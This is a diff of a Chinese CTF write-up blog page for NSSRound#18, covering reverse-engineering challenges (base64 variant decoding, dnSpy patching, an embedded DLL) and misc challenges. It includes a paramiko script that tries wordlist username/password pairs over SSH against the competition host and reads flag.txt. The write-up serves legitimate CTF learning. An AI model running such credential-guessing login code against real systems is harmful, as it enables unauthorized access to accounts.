+<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">table = [</span><br><span class="line">    <span class="number">0xC0</span>, <span class="number">0xC1</span>, <span class="number">0xC2</span>, <span class="number">0xC3</span>, <span class="number">0xC4</span>, <span class="number">0xC5</span>, <span class="number">0xC6</span>, <span class="number">0xC7</span>, <span class="number">0xC8</span>, <span class="number">0xC9</span>,</span><br><span class="line">    <span class="number">0xCA</span>, <span class="number">0xCB</span>, <span class="number">0xCC</span>, <span class="number">0xCD</span>, <span class="number">0xCE</span>, <span class="number">0xCF</span>, <span class="number">0xD0</span>, <span class="number">0xD1</span>, <span class="number">0xD2</span>, <span class="number">0xD3</span>,</span><br><span class="line">    <span class="number">0xD4</span>, <span class="number">0xD5</span>, <span class="number">0xD6</span>, <span class="number">0xD7</span>, <span class="number">0xD8</span>, <span class="number">0xD9</span>, <span class="number">0xE0</span>, <span class="number">0xE1</span>, <span class="number">0xE2</span>, <span class="number">0xE3</span>,</span><br><span class="line">    <span class="number">0xE4</span>, <span class="number">0xE5</span>, <span class="number">0xE6</span>, <span class="number">0xE7</span>, <span class="number">0xE8</span>, <span class="number">0xE9</span>, <span class="number">0xEA</span>, <span class="number">0xEB</span>, <span class="number">0xEC</span>, <span class="number">0xED</span>,</span><br><span class="line">    <span class="number">0xEE</span>, <span class="number">0xEF</span>, <span class="number">0xF0</span>, <span class="number">0xF1</span>, <span class="number">0xF2</span>, <span class="number">0xF3</span>, <span class="number">0xF4</span>, <span class="number">0xF5</span>, <span class="number">0xF6</span>, <span class="number">0xF7</span>,</span><br><span class="line">    <span class="number">0xF8</span>, <span class="number">0xF9</span>, <span class="number">0xAF</span>, <span class="number">0xB0</span>, <span class="number">0xB1</span>, <span class="number">0xB2</span>, <span class="number">0xB3</span>, <span class="number">0xB4</span>, <span class="number">0xB5</span>, <span class="number">0xB6</span>,</span><br><span class="line">    <span class="number">0xB7</span>, <span class="number">0xB8</span>, <span class="number">0xAA</span>, <span class="number">0xAE</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">enc = <span class="built_in">bytearray</span>.fromhex(<span class="string">&quot;E2F7D3E2C8B4D8C5CFB4E7EEE1D9F1EFCBEBD9C9CEC5D9E5CCB7D1EDE0B4F1EEE0E7D2F6CBF3C9F3D3D5EF&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(enc)</span><br><span class="line">idx = []</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> enc:</span><br><span class="line">    idx.append(table.index(i))<span class="comment">#遍历字节数组enc中的每个元素，使用table.index(i)方法找到该元素在table列表中的索引</span></span><br><span class="line"></span><br><span class="line">s = []</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> idx:</span><br><span class="line">    s.append(<span class="built_in">bin</span>(i)[<span class="number">2</span>:].zfill(<span class="number">6</span>))<span class="comment">#zfill左侧填充</span></span><br><span class="line"></span><br><span class="line">res = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> s:</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">0b111111</span>):</span><br><span class="line">        c = <span class="built_in">list</span>(<span class="built_in">bin</span>(j)[<span class="number">2</span>:].zfill(<span class="number">6</span>))</span><br><span class="line">        l = <span class="number">0</span></span><br><span class="line">        r = <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">256</span>,<span class="number">2</span>):<span class="comment">#i=v3+1=i+1+1</span></span><br><span class="line">            l = (k + <span class="number">1</span>) % <span class="number">256</span></span><br><span class="line">            r = (l + r + <span class="number">1</span>) % <span class="number">256</span></span><br><span class="line">            c[l % <span class="number">6</span>], c[r % <span class="number">6</span>] = c[r % <span class="number">6</span>], c[l % <span class="number">6</span>]</span><br><span class="line">        d = <span class="string">&quot;&quot;</span>.join(c)</span><br><span class="line">        <span class="keyword">if</span> d == i:</span><br><span class="line">            res += <span class="built_in">bin</span>(j)[<span class="number">2</span>:].zfill(<span class="number">6</span>)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">b = [res[i:i+<span class="number">8</span>] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(res), <span class="number">8</span>)]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> b:</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">chr</span>(<span class="built_in">int</span>(i, <span class="number">2</span>)), end=<span class="string">&quot;&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#NSSCTF&#123;Y0u_4reThe_K1ng_0fBase64&#125;</span></span><br></pre></td></tr></table></figure></div>
 
-<h2 id="GenshinWishSimulator"><a href="#GenshinWishSimulator" class="headerlink" title="GenshinWishSimulator"></a>GenshinWishSimulator</h2><img src="/2024/02/16/NSSRound18%E9%83%A8%E5%88%86wp/1707900162098-9fff77af-2806-41ac-866c-8991156082c7.png" srcset="/img/loading.gif" lazyload class="" title="img">
+<h2 id="GenshinWishSimulator"><a href="#GenshinWishSimulator" class="headerlink" title="GenshinWishSimulator"></a>GenshinWishSimulator</h2><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2024/02/16/NSSRound18%E9%83%A8%E5%88%86wp/1707900162098-9fff77af-2806-41ac-866c-8991156082c7.png"
+                      class="" title="img"
+                >
 
 <p>用dnspy打开，找关键类*Manager</p>
-<img src="/2024/02/16/NSSRound18%E9%83%A8%E5%88%86wp/1707901366902-a403543b-7c1e-47b6-ad11-9776325c9cd8.png" srcset="/img/loading.gif" lazyload class="" title="img">
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2024/02/16/NSSRound18%E9%83%A8%E5%88%86wp/1707901366902-a403543b-7c1e-47b6-ad11-9776325c9cd8.png"
+                      class="" title="img"
+                >
 
 <p>用z3解方程组</p>
-<img src="/2024/02/16/NSSRound18%E9%83%A8%E5%88%86wp/1707902129974-d2e72bff-cce6-4c4d-affd-f32e5f84bf3f.png" srcset="/img/loading.gif" lazyload class="" title="img">
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2024/02/16/NSSRound18%E9%83%A8%E5%88%86wp/1707902129974-d2e72bff-cce6-4c4d-affd-f32e5f84bf3f.png"
+                      class="" title="img"
+                >
 
 <p>得到iv</p>
-<img src="/2024/02/16/NSSRound18%E9%83%A8%E5%88%86wp/1707902261420-02f82295-67c4-477e-8674-c6ad06b5b9f1.png" srcset="/img/loading.gif" lazyload class="" title="img">
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2024/02/16/NSSRound18%E9%83%A8%E5%88%86wp/1707902261420-02f82295-67c4-477e-8674-c6ad06b5b9f1.png"
+                      class="" title="img"
+                >
 
 <p>145,118,31,48,103,110,52,82,113,19,83,44,176,130,138,129,115,110,38,10,42,100,193,105,125,61,7,229,230,180,68,133,11,177,210,122,161,60,129,140,16,45,224,83,238,0,213,157,121,193,135,197,87,118,155,110,90,91,30,158,248,44,95,215,166,247,239,43,228,114,227,146,164,137,111,79,143,17,132,14</p>
 <p>key和填充方式很明显，但是解不出来？</p>
-<img src="/2024/02/16/NSSRound18%E9%83%A8%E5%88%86wp/1707905579072-8d1e25a1-ec40-4bb9-9c35-60d95850cc67.png" srcset="/img/loading.gif" lazyload class="" title="img">
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2024/02/16/NSSRound18%E9%83%A8%E5%88%86wp/1707905579072-8d1e25a1-ec40-4bb9-9c35-60d95850cc67.png"
+                      class="" title="img"
+                >
 
 <p>md，key和iv弄反了，而且key是utf-8形式，不找借口</p>
-<img src="/2024/02/16/NSSRound18%E9%83%A8%E5%88%86wp/1708008328700-57e3f9c3-60ba-4b81-b999-6e1791f9855f.png" srcset="/img/loading.gif" lazyload class="" title="img">
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2024/02/16/NSSRound18%E9%83%A8%E5%88%86wp/1708008328700-57e3f9c3-60ba-4b81-b999-6e1791f9855f.png"
+                      class="" title="img"
+                >
 
 <p>用另一种方式复现</p>
 <p>要经过check函数才会执行gift</p>
-<img src="/2024/02/16/NSSRound18%E9%83%A8%E5%88%86wp/1708008674108-1e115c0f-0266-4197-9f3b-d3bbd9ae9567.png" srcset="/img/loading.gif" lazyload class="" title="img">
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2024/02/16/NSSRound18%E9%83%A8%E5%88%86wp/1708008674108-1e115c0f-0266-4197-9f3b-d3bbd9ae9567.png"
+                      class="" title="img"
+                >
 
-<img src="/2024/02/16/NSSRound18%E9%83%A8%E5%88%86wp/1708008835792-7cb82437-2578-47d6-a225-1df4bbec6959.png" srcset="/img/loading.gif" lazyload class="" title="img">
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2024/02/16/NSSRound18%E9%83%A8%E5%88%86wp/1708008835792-7cb82437-2578-47d6-a225-1df4bbec6959.png"
+                      class="" title="img"
+                >
 
-<img src="/2024/02/16/NSSRound18%E9%83%A8%E5%88%86wp/1708008882947-d72a0c6a-4e9f-4efb-9dc0-83df6e4af26b.png" srcset="/img/loading.gif" lazyload class="" title="img">
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2024/02/16/NSSRound18%E9%83%A8%E5%88%86wp/1708008882947-d72a0c6a-4e9f-4efb-9dc0-83df6e4af26b.png"
+                      class="" title="img"
+                >
 
 <p>修改初始值的话选择编辑类</p>
-<img src="/2024/02/16/NSSRound18%E9%83%A8%E5%88%86wp/1708008910188-821abe3f-4db0-440d-9c19-04fc8c88a72a.png" srcset="/img/loading.gif" lazyload class="" title="img">
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2024/02/16/NSSRound18%E9%83%A8%E5%88%86wp/1708008910188-821abe3f-4db0-440d-9c19-04fc8c88a72a.png"
+                      class="" title="img"
+                >
 
-<img src="/2024/02/16/NSSRound18%E9%83%A8%E5%88%86wp/1708009108153-0bd6ce8f-8d07-4512-bf4c-d518cbb331f3.png" srcset="/img/loading.gif" lazyload class="" title="img">
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2024/02/16/NSSRound18%E9%83%A8%E5%88%86wp/1708009108153-0bd6ce8f-8d07-4512-bf4c-d518cbb331f3.png"
+                      class="" title="img"
+                >
 
 <p>如果直接保存模块也能出，还是有一定概率</p>
-<img src="/2024/02/16/NSSRound18%E9%83%A8%E5%88%86wp/1708009225510-6cfe7d63-9df6-4784-a4ef-2e73f8f09c5f.png" srcset="/img/loading.gif" lazyload class="" title="img">
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2024/02/16/NSSRound18%E9%83%A8%E5%88%86wp/1708009225510-6cfe7d63-9df6-4784-a4ef-2e73f8f09c5f.png"
+                      class="" title="img"
+                >
 
 <p>要的flag在这里，修改一下使得它必然被执行</p>
-<img src="/2024/02/16/NSSRound18%E9%83%A8%E5%88%86wp/1708009396841-b920b4d0-fa87-45f9-9058-ee4b5bf7bc4d.png" srcset="/img/loading.gif" lazyload class="" title="img">
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2024/02/16/NSSRound18%E9%83%A8%E5%88%86wp/1708009396841-b920b4d0-fa87-45f9-9058-ee4b5bf7bc4d.png"
+                      class="" title="img"
+                >
 
 <p>右键编辑方法</p>
-<img src="/2024/02/16/NSSRound18%E9%83%A8%E5%88%86wp/1708009508484-d19253c5-2bba-428e-b6ea-107e6f5171ee.png" srcset="/img/loading.gif" lazyload class="" title="img">
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2024/02/16/NSSRound18%E9%83%A8%E5%88%86wp/1708009508484-d19253c5-2bba-428e-b6ea-107e6f5171ee.png"
+                      class="" title="img"
+                >
 
-<h2 id="新年快乐"><a href="#新年快乐" class="headerlink" title="新年快乐"></a>新年快乐</h2><img src="/2024/02/16/NSSRound18%E9%83%A8%E5%88%86wp/1708053405853-dab66655-2aa2-48ae-86cf-56d3488772a7.png" srcset="/img/loading.gif" lazyload class="" title="img">
+<h2 id="新年快乐"><a href="#新年快乐" class="headerlink" title="新年快乐"></a>新年快乐</h2><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2024/02/16/NSSRound18%E9%83%A8%E5%88%86wp/1708053405853-dab66655-2aa2-48ae-86cf-56d3488772a7.png"
+                      class="" title="img"
+                >
 
 <p>string有dll</p>
-<img src="/2024/02/16/NSSRound18%E9%83%A8%E5%88%86wp/1708053940754-b3a3b96a-3c0b-458e-a3c4-d72451611a5c.png" srcset="/img/loading.gif" lazyload class="" title="img">
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2024/02/16/NSSRound18%E9%83%A8%E5%88%86wp/1708053940754-b3a3b96a-3c0b-458e-a3c4-d72451611a5c.png"
+                      class="" title="img"
+                >
 
 <p>也没看到有sha256算法</p>
-<img src="/2024/02/16/NSSRound18%E9%83%A8%E5%88%86wp/1708054072607-ad2c4d64-f471-4eb1-b285-19581f54694d.png" srcset="/img/loading.gif" lazyload class="" title="img">
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2024/02/16/NSSRound18%E9%83%A8%E5%88%86wp/1708054072607-ad2c4d64-f471-4eb1-b285-19581f54694d.png"
+                      class="" title="img"
+                >
 
 <p>010搜索MZ</p>
-<img src="/2024/02/16/NSSRound18%E9%83%A8%E5%88%86wp/1708054194721-3290df63-dc66-4aa8-941d-49c46082fa3e.png" srcset="/img/loading.gif" lazyload class="" title="img">
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2024/02/16/NSSRound18%E9%83%A8%E5%88%86wp/1708054194721-3290df63-dc66-4aa8-941d-49c46082fa3e.png"
+                      class="" title="img"
+                >
 
 <p>用Dnspy打开</p>
-<img src="/2024/02/16/NSSRound18%E9%83%A8%E5%88%86wp/1708063124709-72492c56-0475-4245-8080-1c845e3e67ad.png" srcset="/img/loading.gif" lazyload class="" title="img">
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2024/02/16/NSSRound18%E9%83%A8%E5%88%86wp/1708063124709-72492c56-0475-4245-8080-1c845e3e67ad.png"
+                      class="" title="img"
+                >
 
 <p>用vscode运行即可</p>
-<img src="/2024/02/16/NSSRound18%E9%83%A8%E5%88%86wp/1708065409901-24731386-9db8-4c83-a1b8-df148d58cc6e.png" srcset="/img/loading.gif" lazyload class="" title="img">
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2024/02/16/NSSRound18%E9%83%A8%E5%88%86wp/1708065409901-24731386-9db8-4c83-a1b8-df148d58cc6e.png"
+                      class="" title="img"
+                >
 
-<h1 id="misc"><a href="#misc" class="headerlink" title="misc"></a>misc</h1><h2 id="酒吧"><a href="#酒吧" class="headerlink" title="酒吧"></a>酒吧</h2><img src="/2024/02/16/NSSRound18%E9%83%A8%E5%88%86wp/1707897006283-e11c8e66-60d8-453b-bbb4-4923172ebad4.png" srcset="/img/loading.gif" lazyload class="" title="img">
+<h1 id="misc"><a href="#misc" class="headerlink" title="misc"></a>misc</h1><h2 id="酒吧"><a href="#酒吧" class="headerlink" title="酒吧"></a>酒吧</h2><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2024/02/16/NSSRound18%E9%83%A8%E5%88%86wp/1707897006283-e11c8e66-60d8-453b-bbb4-4923172ebad4.png"
+                      class="" title="img"
+                >
 
 
 
-<img src="/2024/02/16/NSSRound18%E9%83%A8%E5%88%86wp/1707897289557-b1b0d72c-33b7-452d-b9d9-3c335f494b72.png" srcset="/img/loading.gif" lazyload class="" title="img">
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2024/02/16/NSSRound18%E9%83%A8%E5%88%86wp/1707897289557-b1b0d72c-33b7-452d-b9d9-3c335f494b72.png"
+                      class="" title="img"
+                >
 
-<img src="/2024/02/16/NSSRound18%E9%83%A8%E5%88%86wp/1707897442652-5643f483-589a-42c4-a7ee-ac578ca09b93.png" srcset="/img/loading.gif" lazyload class="" title="img">
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2024/02/16/NSSRound18%E9%83%A8%E5%88%86wp/1707897442652-5643f483-589a-42c4-a7ee-ac578ca09b93.png"
+                      class="" title="img"
+                >
 
-<img src="/2024/02/16/NSSRound18%E9%83%A8%E5%88%86wp/1707897125919-70ff2871-f8fc-49d1-af17-80f663910385.png" srcset="/img/loading.gif" lazyload class="" title="img">
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2024/02/16/NSSRound18%E9%83%A8%E5%88%86wp/1707897125919-70ff2871-f8fc-49d1-af17-80f663910385.png"
+                      class="" title="img"
+                >
 
 
 
 <h2 id="number7"><a href="#number7" class="headerlink" title="number7"></a>number7</h2><p>直接解base64会出错，修改第七个和第九个数字从0到f都不对</p>
-<img src="/2024/02/16/NSSRound18%E9%83%A8%E5%88%86wp/1707898430820-55d77299-2129-495c-8f4b-9674a7e705b3.png" srcset="/img/loading.gif" lazyload class="" title="img">
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2024/02/16/NSSRound18%E9%83%A8%E5%88%86wp/1707898430820-55d77299-2129-495c-8f4b-9674a7e705b3.png"
+                      class="" title="img"
+                >
 
 
 
 <p>根据Number7 而且inside NO.7猜测cisco type7加密</p>
-<p>后面少了几位，但是不影响flag<img src="/2024/02/16/NSSRound18%E9%83%A8%E5%88%86wp/1708007743062-01c8b0da-a225-42ab-8bf6-0c5ee8524710.png" srcset="/img/loading.gif" lazyload class="" title="img"></p>
+<p>后面少了几位，但是不影响flag<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2024/02/16/NSSRound18%E9%83%A8%E5%88%86wp/1708007743062-01c8b0da-a225-42ab-8bf6-0c5ee8524710.png"
+                      class="" title="img"
+                ></p>
 <h2 id="userssss"><a href="#userssss" class="headerlink" title="userssss"></a>userssss</h2><p>想法是写脚本算md5sum，然后自动交互</p>
-<img src="/2024/02/16/NSSRound18%E9%83%A8%E5%88%86wp/1707899075674-94d6549e-74b1-4fa9-9a6d-11d6ac0001c0.png" srcset="/img/loading.gif" lazyload class="" title="img">
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2024/02/16/NSSRound18%E9%83%A8%E5%88%86wp/1707899075674-94d6549e-74b1-4fa9-9a6d-11d6ac0001c0.png"
+                      class="" title="img"
+                >
 
 <p>不知道要向远程怎么发送，要有用户名和密码</p>
-<img src="/2024/02/16/NSSRound18%E9%83%A8%E5%88%86wp/1707899762242-e173afcc-df88-420a-a26c-f2ae5bb6c5c8.png" srcset="/img/loading.gif" lazyload class="" title="img">
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2024/02/16/NSSRound18%E9%83%A8%E5%88%86wp/1707899762242-e173afcc-df88-420a-a26c-f2ae5bb6c5c8.png"
+                      class="" title="img"
+                >
 
 <p>首先md5sum就是MD5，其次用ssh -p连接</p>
-<img src="/2024/02/16/NSSRound18%E9%83%A8%E5%88%86wp/1708009841111-baa8ea56-12cd-4ef5-bb68-60ab768691fb.png" srcset="/img/loading.gif" lazyload class="" title="img">
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2024/02/16/NSSRound18%E9%83%A8%E5%88%86wp/1708009841111-baa8ea56-12cd-4ef5-bb68-60ab768691fb.png"
+                      class="" title="img"
+                >
 
 <p>自动算md5</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/bin/bash</span><br><br><span class="hljs-built_in">input</span>=<span class="hljs-string">&quot;/CVE/wordlist.txt&quot;</span><br>output=<span class="hljs-string">&quot;/CVE/4.txt&quot;</span><br><br><span class="hljs-comment"># 重置输出文件</span><br>&gt; <span class="hljs-string">&quot;$output&quot;</span><br><br><span class="hljs-comment"># 遍历wordlist.txt中的每一行</span><br><span class="hljs-keyword">while</span> IFS= read -r line || [[ -n <span class="hljs-string">&quot;$line&quot;</span> ]]; do<br>    <span class="hljs-comment"># 跳过空白行</span><br>    <span class="hljs-keyword">if</span> [[ -z <span class="hljs-string">&quot;$line&quot;</span> ]]; then<br>        <span class="hljs-keyword">continue</span><br>    fi<br><br>    <span class="hljs-comment"># 计算每行的MD5哈希值</span><br>    md5=$(echo -n <span class="hljs-string">&quot;$line&quot;</span> | md5sum | awk <span class="hljs-string">&#x27;&#123;print $1&#125;&#x27;</span>)<br>    <br>    <span class="hljs-comment"># 将计算出的哈希值追加到4.txt文件中</span><br>    echo <span class="hljs-string">&quot;$md5&quot;</span> &gt;&gt; <span class="hljs-string">&quot;$output&quot;</span><br>done &lt; <span class="hljs-string">&quot;$input&quot;</span><br></code></pre></td></tr></table></figure>
+<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/bin/bash</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">input</span>=<span class="string">&quot;/CVE/wordlist.txt&quot;</span></span><br><span class="line">output=<span class="string">&quot;/CVE/4.txt&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 重置输出文件</span></span><br><span class="line">&gt; <span class="string">&quot;$output&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 遍历wordlist.txt中的每一行</span></span><br><span class="line"><span class="keyword">while</span> IFS= read -r line || [[ -n <span class="string">&quot;$line&quot;</span> ]]; do</span><br><span class="line">    <span class="comment"># 跳过空白行</span></span><br><span class="line">    <span class="keyword">if</span> [[ -z <span class="string">&quot;$line&quot;</span> ]]; then</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    fi</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 计算每行的MD5哈希值</span></span><br><span class="line">    md5=$(echo -n <span class="string">&quot;$line&quot;</span> | md5sum | awk <span class="string">&#x27;&#123;print $1&#125;&#x27;</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 将计算出的哈希值追加到4.txt文件中</span></span><br><span class="line">    echo <span class="string">&quot;$md5&quot;</span> &gt;&gt; <span class="string">&quot;$output&quot;</span></span><br><span class="line">done &lt; <span class="string">&quot;$input&quot;</span></span><br></pre></td></tr></table></figure></div>
 
 <p>自动交互</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> paramiko<br><br><span class="hljs-comment"># 设置主机信息</span><br>hostname = <span class="hljs-string">&#x27;node1.anna.nssctf.cn&#x27;</span><br>port = <span class="hljs-number">28591</span><br><br><span class="hljs-comment"># 读取用户名和密码列表</span><br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;wordlist.txt&#x27;</span>, <span class="hljs-string">&#x27;r&#x27;</span>) <span class="hljs-keyword">as</span> user_file:<br>    usernames = user_file.read().splitlines()<br><br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;10.txt&#x27;</span>, <span class="hljs-string">&#x27;r&#x27;</span>) <span class="hljs-keyword">as</span> pass_file:<br>    passwords = pass_file.read().splitlines()<br><br><span class="hljs-comment"># 确保用户名和密码列表长度相同</span><br><span class="hljs-keyword">assert</span> <span class="hljs-built_in">len</span>(usernames) == <span class="hljs-built_in">len</span>(passwords), <span class="hljs-string">&quot;用户名和密码数量不匹配&quot;</span><br><br><span class="hljs-comment"># 尝试登录并执行命令</span><br><span class="hljs-keyword">for</span> username, password <span class="hljs-keyword">in</span> <span class="hljs-built_in">zip</span>(usernames, passwords):<br>    <span class="hljs-keyword">try</span>:<br>        <span class="hljs-comment"># 初始化SSH客户端</span><br>        client = paramiko.SSHClient()<br>        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())<br>        <br>        <span class="hljs-comment"># 尝试连接</span><br>        client.connect(hostname, port, username, password, timeout=<span class="hljs-number">10</span>)<br>        <br>        <span class="hljs-comment"># 执行ls命令</span><br>        stdin, stdout, stderr = client.exec_command(<span class="hljs-string">&#x27;ls&#x27;</span>)<br>        output = stdout.read().decode(<span class="hljs-string">&#x27;utf-8&#x27;</span>)<br>        <br>        <span class="hljs-comment"># 检查是否存在flag.txt</span><br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;flag.txt&#x27;</span> <span class="hljs-keyword">in</span> output:<br>            <span class="hljs-comment"># 读取flag.txt内容</span><br>            stdin, stdout, stderr = client.exec_command(<span class="hljs-string">&#x27;cat flag.txt&#x27;</span>)<br>            flag_content = stdout.read().decode(<span class="hljs-string">&#x27;utf-8&#x27;</span>).strip()<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;找到flag: <span class="hljs-subst">&#123;flag_content&#125;</span>&quot;</span>)<br>            <span class="hljs-keyword">break</span><br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;在用户 <span class="hljs-subst">&#123;username&#125;</span> 的目录中没有找到flag.txt&quot;</span>)<br>        <br>    <span class="hljs-keyword">except</span> paramiko.AuthenticationException:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;登录失败：用户名 <span class="hljs-subst">&#123;username&#125;</span> 或密码错误&quot;</span>)<br>    <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;发生错误：<span class="hljs-subst">&#123;<span class="hljs-built_in">str</span>(e)&#125;</span>&quot;</span>)<br>    <span class="hljs-keyword">finally</span>:<br>        client.close()<br></code></pre></td></tr></table></figure>
+<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span 